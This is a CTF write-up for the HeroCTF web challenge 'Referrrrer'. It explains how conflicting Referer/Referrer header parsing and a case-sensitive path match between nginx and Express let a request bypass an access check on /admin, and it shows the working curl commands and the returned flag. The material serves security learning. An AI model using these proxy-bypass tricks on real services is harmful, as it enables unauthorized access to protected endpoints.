# Referrrrer [193 solves] [50 points]

This challenge is running nodejs behind nginx

index.js :
```
const express = require("express")
const app = express()


app.get("/", (req, res) => {
    res.send("Hello World!");
})

app.get("/admin", (req, res) => {
    if (req.header("referer") === "YOU_SHOUD_NOT_PASS!") {
        return res.send(process.env.FLAG);
    }

    res.send("Wrong header!");
})

app.listen(3000, () => {
    console.log("App listening on port 3000");
})
```

So to get to flag, we have to make a GET request to /admin with the referer header as "YOU_SHOUD_NOT_PASS!"

nginx.conf :
```
worker_processes auto;

events {
    worker_connections 128;
}

http {
    charset utf-8;

    access_log /dev/stdout;
    error_log /dev/stdout;

    upstream express_app {
        server app:3000;
    }

    server {
        listen 80;
        server_name example.com;

        location / {
            proxy_pass http://express_app;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }

        location /admin {
            if ($http_referer !~* "^https://admin\.internal\.com") {
                return 403;
            }

            proxy_pass http://express_app;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}
```

However in nginx.conf, it will return 403 error if our referer header is not starting with "https://admin.internal.com"

So in order to get the flag, we have to find some ways that nginx and nodejs parse the referer header differently, or some ways that satisfy both of the requirements

I tried to use some ways like capital letters and small letters for the header, however they didn't work

Reading the expressjs code :
https://github.com/expressjs/express/blob/master/lib/request.js#L40-L84

```
 * The `Referrer` header field is special-cased,
 * both `Referrer` and `Referer` are interchangeable.
```

It mentioned that `Referrer` and `Referer` are interchangable

Maybe we can set 'Referrer' to "YOU_SHOUD_NOT_PASS!" and 'Referer' to "https://admin.internal.com"

```
$ curl -i -H 'Referrer: YOU_SHOUD_NOT_PASS!' -H 'Referer: https://admin.internal.com' http://static-01.heroctf.fr:7000/admin
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Sun, 14 May 2023 12:42:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 38
Connection: keep-alive
X-Powered-By: Express
ETag: W/"26-Cj1P1GdO8Vke/DfJFC3B2cH95nw"

Hero{ba7b97ae00a760b44cc8c761e6d4535b}$
$
```

It worked and we got the flag

Also, there's another way to solve this, I can make a request to /Admin with a capital letter 'A', and it can bypass nginx's check, but nodejs still see it as /admin :

```
$ curl -i -H 'Referrer: YOU_SHOUD_NOT_PASS!' http://static-01.heroctf.fr:7000/Admin

HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Sun, 14 May 2023 13:23:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 38
Connection: keep-alive
X-Powered-By: Express
ETag: W/"26-Cj1P1GdO8Vke/DfJFC3B2cH95nw"

Hero{ba7b97ae00a760b44cc8c761e6d4535b}
```